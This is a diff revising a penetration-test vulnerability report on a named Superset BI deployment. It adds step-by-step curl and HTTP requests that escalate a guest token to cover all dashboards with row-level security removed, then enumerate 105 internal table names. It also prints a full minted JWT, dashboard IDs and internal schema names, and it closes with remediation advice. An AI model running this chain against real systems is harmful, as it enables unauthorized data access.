@@ -11,6 +11,8 @@
 
 A Superset guest token — intended for read-only access to a single embedded dashboard — can enumerate **105 internal datasource table names** by iterating over sequential datasource IDs at `GET /datasource/get/table/<id>/`. The 403 error responses include a `datasource_name` field in the JSON body that leaks the fully-qualified `database.table_name` for every datasource in the Superset instance.
 
+The attack is amplified by chaining with the guest token minting vulnerability (`POST /api/v1/security/guest_token/`): a guest user can first mint a token scoped to **all 21 dashboards with no RLS**, then use that elevated token to enumerate all datasources.
+
 The leaked table names reveal:
 - **Internal security audit tables** tracking permission misconfigurations across customer companies
 - **7 distinct database schemas** including production, development, temporary, and individual developer schemas
@@ -23,16 +25,165 @@ The leaked table names reveal:
 
 ## Steps to Reproduce
 
-### Step 1 — Obtain guest token
+### Step 1 — Obtain initial guest token
 
-Log in to `partner.trustpoint.ai` as any user. Navigate to the BI analytics page. Capture the guest token from the `X-Guesttoken` header in browser DevTools.
+Log in to `partner.trustpoint.ai` as any user (Investor, Borrower, etc.). Navigate to the BI analytics page. The embedded Superset dashboard loads automatically. Capture the guest token from the `X-Guesttoken` request header in browser DevTools (Network tab).
 
-### Step 2 — Enumerate datasource IDs
+The original guest token is scoped to **one dashboard** with **company-specific RLS**:
+
+**Decoded JWT payload:**
+```json
+{
+  "user": {"first_name": "Pentest", "last_name": "Investor 2 3"},
+  "resources": [{"type": "dashboard", "id": "ea095d5e-d7a0-498f-aaa4-e00a2a5a14d5"}],
+  "rls_rules": [{"clause": "user_company_ids::jsonb ? '349823e1-322f-4dff-ac4a-b7d915b86875'"}],
+  "aud": "http://superion-app:8088/",
+  "type": "guest"
+}
+```
+
+### Step 2 — Verify guest token has excessive permissions
+
+```bash
+curl -s 'https://bi.trustpoint.ai/api/v1/me/roles/' \
+  -H 'X-Guesttoken: <guest_token>' \
+  -H 'Cookie: session=<session_cookie>'
+```
+
+**Response:** `200 OK`
+
+```json
+{
+  "result": {
+    "roles": {
+      "EMBEDDED DASHBOARD ACCESS": [
+        ["can_grant_guest_token", "SecurityRestApi"],
+        ["can_get", "Datasource"],
+        ["can_external_metadata_by_name", "Datasource"],
+        ["can_read", "Dashboard"],
+        ["can_read", "Chart"],
+        ["can_read", "Dataset"],
+        ["can_csv", "Superset"],
+        ["can_query", "Api"],
+        ["can_explore_json", "Superset"],
+        ["can_read", "Annotation"],
+        ["can_read", "AnnotationLayerModelView"],
+        ["can_write", "DashboardFilterStateRestApi"],
+        ["can_read", "DashboardFilterStateRestApi"],
+        ["can_warm_up_cache", "Superset"],
+        ["can_dashboard", "Superset"],
+        ["can_get", "DashboardPermalinkRestApi"],
+        ["can_post", "DashboardPermalinkRestApi"]
+      ]
+    }
+  }
+}
+```
+
+Two critical permissions enable this attack:
+- **`can_grant_guest_token`** on `SecurityRestApi` — allows minting new tokens (Step 3)
+- **`can_get`** on `Datasource` — allows probing `/datasource/get/table/<id>/` (Step 4)
+
+### Step 3 — Mint elevated token via `POST /api/v1/security/guest_token/`
+
+Using the initial guest token, mint a new token scoped to **all 21 dashboards** with **no RLS rules**:
+
+**Request:**
+
+```http
+POST /api/v1/security/guest_token/ HTTP/2
+Host: bi.trustpoint.ai
+X-Guesttoken: <initial_guest_token>
+Cookie: session=<session_cookie>
+Content-Type: application/json
+
+{
+  "user": {"first_name": "Test", "last_name": "User"},
+  "resources": [
+    {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
+    {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
+    {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
+    {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
+    {"type": "dashboard", "id": "4ae3dc65-a23c-4a07-8ce3-8be0fb4e3faa"},
+    {"type": "dashboard", "id": "909c2bc7-1258-495f-beca-7f0ddb7c2e15"},
+    {"type": "dashboard", "id": "c123cdf8-dceb-476f-8a37-35150475b94e"},
+    {"type": "dashboard", "id": "6fa685be-24f5-475b-96f2-f57bc11893be"},
+    {"type": "dashboard", "id": "9f1e3b4f-17ca-401c-bea9-ae790a9caa89"},
+    {"type": "dashboard", "id": "bd3d8e68-013e-4b60-b95a-3ff2387ba5a8"},
+    {"type": "dashboard", "id": "0e1b5262-b6bc-448f-8abc-e4c1c26cf1a8"},
+    {"type": "dashboard", "id": "c9e2a06b-deaf-4ef4-a958-36caa3a33826"},
+    {"type": "dashboard", "id": "a863836b-23e5-46f9-9339-2c56a2dbfd8e"},
+    {"type": "dashboard", "id": "00366810-f407-4342-9071-ebeb7fff2e15"},
+    {"type": "dashboard", "id": "8ff73096-98f7-4316-8ccb-a47c4602874f"},
+    {"type": "dashboard", "id": "0649dc3b-7a26-4745-be8c-72c13eff1027"},
+    {"type": "dashboard", "id": "81532b92-6ccd-4a5f-8a69-050d55ae89e7"},
+    {"type": "dashboard", "id": "dc661108-f268-4df3-baf3-a99008b3e754"},
+    {"type": "dashboard", "id": "789085c3-3545-4def-8a69-ac9a96772e95"},
+    {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"},
+    {"type": "dashboard", "id": "6b0158d4-0e56-4ddb-ab6e-c5bd172a6bf9"}
+  ],
+  "rls": []
+}
+```
+
+**Response:** `200 OK`
+
+```json
+{
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImZpcnN0X25hbWUiOiJUZXN0IiwibGFzdF9uYW1lIjoiVXNlciJ9LCJyZXNvdXJjZXMiOlt7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImNjMWJiZDlmLTA5YjctNDQ4Ny05MWVjLTRhOTczY2FiZDNkYiJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiYTRiZWVmMDUtNjNlMC00NWVhLTg2MTItMzg4ODFmYTcwNThjIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJhMzVlMDdmOC04OWYxLTQ4OGMtYWUzOS04NjM1NjRiYjFiMWYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImJkOThmOWIzLTY5ODMtNDBhNC04ZWI1LWVjOWRlOWQzMDIyNCJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiNGFlM2RjNjUtYTIzYy00YTA3LThjZTMtOGJlMGZiNGUzZmFhIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI5MDljMmJjNy0xMjU4LTQ5NWYtYmVjYS03ZjBkZGI3YzJlMTUifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImMxMjNjZGY4LWRjZWItNDc2Zi04YTM3LTM1MTUwNDc1Yjk0ZSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiNmZhNjg1YmUtMjRmNS00NzViLTk2ZjItZjU3YmMxMTg5M2JlIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI5ZjFlM2I0Zi0xN2NhLTQwMWMtYmVhOS1hZTc5MGE5Y2FhODkifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImJkM2Q4ZTY4LTAxM2UtNGI2MC1iOTVhLTNmZjIzODdiYTVhOCJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMGUxYjUyNjItYjZiYy00NDhmLThhYmMtZTRjMWMyNmNmMWE4In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJjOWUyYTA2Yi1kZWFmLTRlZjQtYTk1OC0zNmNhYTNhMzM4MjYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6ImE4NjM4MzZiLTIzZTUtNDZmOS05MzM5LTJjNTZhMmRiZmQ4ZSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMDAzNjY4MTAtZjQwNy00MzQyLTkwNzEtZWJlYjdmZmYyZTE1In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI4ZmY3MzA5Ni05OGY3LTQzMTYtOGNjYi1hNDdjNDYwMjg3NGYifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6IjA2NDlkYzNiLTdhMjYtNDc0NS1iZThjLTcyYzEzZWZmMTAyNyJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiODE1MzJiOTItNmNjZC00YTVmLThhNjktMDUwZDU1YWU4OWU3In0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiJkYzY2MTEwOC1mMjY4LTRkZjMtYmFmMy1hOTkwMDhiM2U3NTQifSx7InR5cGUiOiJkYXNoYm9hcmQiLCJpZCI6Ijc4OTA4NWMzLTM1NDUtNGRlZi04YTY5LWFjOWE5Njc3MmU5NSJ9LHsidHlwZSI6ImRhc2hib2FyZCIsImlkIjoiMjI5YzViM2ItYTdlMy00YTA2LWEzNWItZGE2Y2Y3ZjA1NTYyIn0seyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiI2YjAxNThkNC0wZTU2LTRkZGItYWI2ZS1jNWJkMTcyYTZiZjkifV0sInJsc19ydWxlcyI6W10sImlhdCI6MTc5MjA2ODU0NC44Mjc4NzYsImV4cCI6MTc5MjA3MjE0NC44Mjc4NzYsImF1ZCI6Imh0dHA6Ly9zdXBlcmlvbi1hcHA6ODA4OC8iLCJ0eXBlIjoiZ3Vlc3QifQ.FFJpGRV8iTKU_kvxPWWFKQd-Tnb_7-QKvV_gV7x4M7E"
+}
+```
+
+**Decoded minted token payload (key fields):**
+
+```json
+{
+  "user": {"first_name": "Test", "last_name": "User"},
+  "resources": [
+    {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
+    {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
+    {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
+    {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
+    {"type": "dashboard", "id": "4ae3dc65-a23c-4a07-8ce3-8be0fb4e3faa"},
+    {"type": "dashboard", "id": "909c2bc7-1258-495f-beca-7f0ddb7c2e15"},
+    {"type": "dashboard", "id": "c123cdf8-dceb-476f-8a37-35150475b94e"},
+    {"type": "dashboard", "id": "6fa685be-24f5-475b-96f2-f57bc11893be"},
+    {"type": "dashboard", "id": "9f1e3b4f-17ca-401c-bea9-ae790a9caa89"},
+    {"type": "dashboard", "id": "bd3d8e68-013e-4b60-b95a-3ff2387ba5a8"},
+    {"type": "dashboard", "id": "0e1b5262-b6bc-448f-8abc-e4c1c26cf1a8"},
+    {"type": "dashboard", "id": "c9e2a06b-deaf-4ef4-a958-36caa3a33826"},
+    {"type": "dashboard", "id": "a863836b-23e5-46f9-9339-2c56a2dbfd8e"},
+    {"type": "dashboard", "id": "00366810-f407-4342-9071-ebeb7fff2e15"},
+    {"type": "dashboard", "id": "8ff73096-98f7-4316-8ccb-a47c4602874f"},
+    {"type": "dashboard", "id": "0649dc3b-7a26-4745-be8c-72c13eff1027"},
+    {"type": "dashboard", "id": "81532b92-6ccd-4a5f-8a69-050d55ae89e7"},
+    {"type": "dashboard", "id": "dc661108-f268-4df3-baf3-a99008b3e754"},
+    {"type": "dashboard", "id": "789085c3-3545-4def-8a69-ac9a96772e95"},
+    {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"},
+    {"type": "dashboard", "id": "6b0158d4-0e56-4ddb-ab6e-c5bd172a6bf9"}
+  ],
+  "rls_rules": [],
+  "aud": "http://superion-app:8088/",
+  "type": "guest"
+}
+```
+
+**Comparison — Original vs Minted Token:**
+
+| Property | Original Token | Minted Token |
+|----------|---------------|--------------|
+| Dashboard scope | 1 dashboard (assigned) | **All 21 dashboards** (attacker-chosen) |
+| RLS rules | `user_company_ids::jsonb ? '<company_id>'` | `[]` (**empty — no filtering**) |
+| User identity | Real user name | Attacker-controlled |
+
+### Step 4 — Enumerate all datasources using minted token
+
+Using the minted token from Step 3, iterate over sequential datasource IDs:
 
 ```bash
 for ds_id in $(seq 1 302); do
   curl -s "https://bi.trustpoint.ai/datasource/get/table/$ds_id/" \
-    -H "X-Guesttoken: <guest_token>" \
+    -H "X-Guesttoken: <minted_token>" \
     -H "Cookie: session=<session_cookie>" 2>/dev/null | \
   python3 -c "
 import sys,json
@@ -47,25 +198,20 @@ done
 
 **Result:** 105 datasource names returned in 403 error responses.
 
----
+### Step 5 — Verify datasource name leakage in 403 response
 
-## Proof of Concept
-
-### Request
+**Request:**
 
 ```http
 GET /datasource/get/table/281/ HTTP/2
 Host: bi.trustpoint.ai
-X-Guesttoken: <guest_token>
+X-Guesttoken: <minted_token>
 Cookie: session=<session_cookie>
 ```
 
-### Response
+**Response:** `403 Forbidden`
 
-```http
-HTTP/2 403
-Content-Type: application/json
-
+```json
 {
   "errors": [
     {
@@ -82,7 +228,90 @@ Content-Type: application/json
 }
 ```
 
-The response correctly denies data access (403) but **leaks the full table name** in the error body.
+The response correctly denies data access (403) but **leaks the full table name** `tp_source_bumblebee.misconfig_borrower_dangerous_permissions` in the error body.
+
+**Additional sample responses:**
+
+**DS 112 — Loan tape data:**
+```json
+{
+  "errors": [{
+    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
+    "extra": {
+      "datasource": 112,
+      "datasource_name": "tp_dw_production.rpt_loan_tape"
+    }
+  }]
+}
+```
+
+**DS 260 — Company role permissions:**
+```json
+{
+  "errors": [{
+    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
+    "extra": {
+      "datasource": 260,
+      "datasource_name": "tp_dw_dev.company_role_permissions"
+    }
+  }]
+}
+```
+
+**DS 211 — Developer personal schema:**
+```json
+{
+  "errors": [{
+    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
+    "extra": {
+      "datasource": 211,
+      "datasource_name": "dev_yufeng.adhoc_line_item_draw_request"
+    }
+  }]
+}
+```
+
+**DS 298 — Investor loan snapshots:**
+```json
+{
+  "errors": [{
+    "error_type": "DATASOURCE_SECURITY_ACCESS_ERROR",
+    "extra": {
+      "datasource": 298,
+      "datasource_name": "tp_dw_production.rpt_investor_loan_snapshot"
+    }
+  }]
+}
+```
+
+---
+
+## Full Attack Chain
+
+```
+partner.trustpoint.ai (any user login)
+        │
+        ▼
+Step 1: Capture guest token from embedded dashboard
+        (scoped to 1 dashboard, with RLS)
+        │
+        ▼
+Step 2: Verify excessive permissions
+        can_grant_guest_token + can_get on Datasource
+        │
+        ▼
+Step 3: POST /api/v1/security/guest_token/
+        Mint new token → 21 dashboards, NO RLS
+        │
+        ▼
+Step 4: GET /datasource/get/table/<id>/  (id = 1..302)
+        403 responses leak datasource_name in error body
+        │
+        ▼
+Result: 105 internal table names across 7 databases
+        Including security audit tables, financial data,
+        dev schemas, and permission structures
+```
 
 ---
 
@@ -194,12 +423,20 @@ Includes product analytics, feature adoption tracking, AI document parsing usage
 
 The `external_metadata_by_name` endpoint (accessible to guest tokens via `can_external_metadata_by_name` permission) reveals the Superset database connection name:
 
-```bash
-curl -s 'https://bi.trustpoint.ai/datasource/external_metadata_by_name/?q=(datasource_type:table,database_name:Trustpoint%20DW,table_name:rpt_project,schema_name:public,normalize_columns:!t,always_filter_main_dttm:!f)' \
-  -H "X-Guesttoken: <guest_token>"
+**Request:**
+```http
+GET /datasource/external_metadata_by_name/?q=(datasource_type:table,database_name:Trustpoint%20DW,table_name:rpt_project,schema_name:public,normalize_columns:!t,always_filter_main_dttm:!f) HTTP/2
+Host: bi.trustpoint.ai
+X-Guesttoken: <minted_token>
 ```
 
-**Result:** `500 Internal Server Error` (not 404 "Dataset does not exist") — confirms the Superset database connection is named **"Trustpoint DW"**. The 500 error itself is a bug (`'Datasource' object has no attribute 'response_400'`) that leaks internal implementation details.
+**Response:** `500 Internal Server Error`
+
+```
+'Datasource' object has no attribute 'response_400'
+```
+
+The 500 (not 404 "Dataset does not exist") confirms the Superset database connection is named **"Trustpoint DW"**. The 500 error itself is a bug that leaks internal implementation details.
 
 ### Internal Hostname in JWT
 
@@ -231,10 +468,11 @@ Timestamped query names (e.g., "Query tp_source_bumblebee.company_integrations 0
 
 ## Remediation
 
-1. **Strip `datasource_name` from 403 error responses** — return only the generic "access denied" message without the `extra` block containing the table name
-2. **Remove `can_get` on Datasource and `can_external_metadata_by_name` on Datasource from the EMBEDDED DASHBOARD ACCESS role** — guest users should not be able to probe datasource metadata
-3. **Fix the `response_400` AttributeError** in the `external_metadata_by_name` endpoint — the Datasource view class is missing this method, causing unhandled 500 errors
-4. **Rate-limit or block sequential ID enumeration** on the `/datasource/get/table/<id>/` endpoint
+1. **Remove `can_grant_guest_token` from the `EMBEDDED DASHBOARD ACCESS` role** — guest users must never mint new tokens. This permission should be restricted to the backend service account
+2. **Strip `datasource_name` from 403 error responses** — return only the generic "access denied" message without the `extra` block containing the table name
+3. **Remove `can_get` on Datasource and `can_external_metadata_by_name` on Datasource from the EMBEDDED DASHBOARD ACCESS role** — guest users should not be able to probe datasource metadata
+4. **Fix the `response_400` AttributeError** in the `external_metadata_by_name` endpoint — the Datasource view class is missing this method, causing unhandled 500 errors
+5. **Rate-limit or block sequential ID enumeration** on the `/datasource/get/table/<id>/` endpoint
 
 ---
 
@@ -242,4 +480,6 @@ Timestamped query names (e.g., "Query tp_source_bumblebee.company_integrations 0
 
 - [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
 - [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
+- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
 - [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
+- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
